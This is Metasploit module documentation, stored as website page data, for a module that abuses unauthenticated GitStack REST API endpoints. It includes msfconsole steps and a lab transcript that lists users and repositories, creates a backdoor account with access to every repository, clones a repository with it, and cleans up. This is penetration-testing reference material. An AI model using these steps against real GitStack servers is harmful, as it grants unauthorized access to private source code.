{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/auxiliary/admin/http/gitstack_rest","result":{"data":{"moduleMetadataJson":{"id":"46e9d983-ffe1-582c-a213-85eeb232c09a","name":"GitStack Unauthenticated REST API Requests","fullname":"auxiliary/admin/http/gitstack_rest","description":"This modules exploits unauthenticated REST API requests in GitStack through v2.3.10.\n        The module supports requests for listing users of the application and listing\n        available repositories. Additionally, the module can create a user and add the user\n        to the application's repositories. This module has been tested against GitStack v2.3.10.","rank":300,"fields":{"detailsSlug":"/modules/details/auxiliary/admin/http/gitstack_rest","documentationSlug":"/modules/documentation/auxiliary/admin/http/gitstack_rest"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>GitStack through v2.3.10 contains unauthenticated REST API endpoints that can be used to retrieve information about the application and make changes to it as well. This module generates requests to the vulnerable API endpoints. This module has been tested against GitStack v2.3.10.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>The GitStack application provides REST API functionality to list application users, list application repositories, create application users, etc. Several of the application's REST API endpoints do not require authentication, which allows those with network-level access to the application to take advantage of these unprotected requests.</p>\n<p>Application user accounts created through the REST API do not have access to the admin web interface, but the accounts can be added and removed from repositories using additional API requests.</p>\n<h2 id=\"actions\" style=\"position:relative;\"><a href=\"#actions\" aria-label=\"actions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Actions</h2>\n<p><strong>LIST</strong></p>\n<p>List application user accounts. </p>\n<p>Note: The account <code class=\"language-text\">everyone</code> is a default account.</p>\n<p><strong>LIST_REPOS</strong></p>\n<p>List application repositories.</p>\n<p><strong>CREATE</strong></p>\n<p>Create a user account and add the account to all available repositories.</p>\n<p><strong>CLEANUP</strong></p>\n<p>Remove the specified application user account from all available repositories and delete the application account.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ul>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Install a vulnerable GitStack application</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Create a few application user accounts</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Create a few application repositories</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <code class=\"language-text\">./msfconsole</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <code class=\"language-text\">use auxiliary/admin/http/gitstack_rest</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <code class=\"language-text\">set rhost &lt;rhost&gt;</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <code class=\"language-text\">run</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Verify the application user list that is returned</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <code class=\"language-text\">set action LIST_REPOS</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <code class=\"language-text\">run</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Verify the repository list that is returned</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <code class=\"language-text\">set username &lt;username&gt;</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <code class=\"language-text\">set password &lt;password&gt;</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <code class=\"language-text\">set action CREATE</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <code class=\"language-text\">run</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> On the application verify that the user has been created</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> On the application verify that the user has access to the repositories</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <code class=\"language-text\">set action CLEANUP</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <code class=\"language-text\">run</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> On the application verify that the user doesn't have access to the repositories</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> On the application verify that the user has been deleted</li>\n</ul>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"gitstack-v2310-on-windows-7-sp1-x64\" style=\"position:relative;\"><a href=\"#gitstack-v2310-on-windows-7-sp1-x64\" aria-label=\"gitstack v2310 on windows 7 sp1 x64 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>GitStack v2.3.10 on Windows 7 SP1 x64</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msfdev@simulator:~/git/metasploit-framework$ ./msfconsole -q -r test.rc \n[*] Processing test.rc for ERB directives.\nresource (test.rc)&gt; use auxiliary/admin/http/gitstack_rest\nresource (test.rc)&gt; set rhost 172.22.222.122\nrhost =&gt; 172.22.222.122\nresource (test.rc)&gt; run\n[*] User List:\n[+] rick\n[+] morty\n[+] everyone\n[*] Auxiliary module execution completed\nresource (test.rc)&gt; set action LIST_REPOS\naction =&gt; LIST_REPOS\nresource (test.rc)&gt; run\n[*] Repo List:\n[+] brainalyzer\n[+] c137\n[*] Auxiliary module execution completed\nresource (test.rc)&gt; set action CREATE\naction =&gt; CREATE\nresource (test.rc)&gt; run\n[+] SUCCESS: msf:password\n[+] User msf added to brainalyzer\n[+] User msf added to c137\n[*] Auxiliary module execution completed\nresource (test.rc)&gt; set action CLEANUP\naction =&gt; CLEANUP\nresource (test.rc)&gt; run\n[+] msf removed from brainalyzer\n[+] msf removed from c137\n[+] msf has been deleted\n[*] Auxiliary module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>After CREATE, but before CLEANUP, use git to clone the remote repositories.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msfdev@simulator:~/money-bugs$ git clone http://msf:password@172.22.222.122/brainalyzer.git\nCloning into &#39;brainalyzer&#39;...\nremote: Counting objects: 3, done.\nUnpacking objects: 100% (3/3), done.\nremote: Total 3 (delta 0), reused 0 (delta 0)\nmsfdev@simulator:~/money-bugs$ cd brainalyzer/ &amp;&amp; ls\nszechuan_sauce.md</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"46e9d983-ffe1-582c-a213-85eeb232c09a"}}}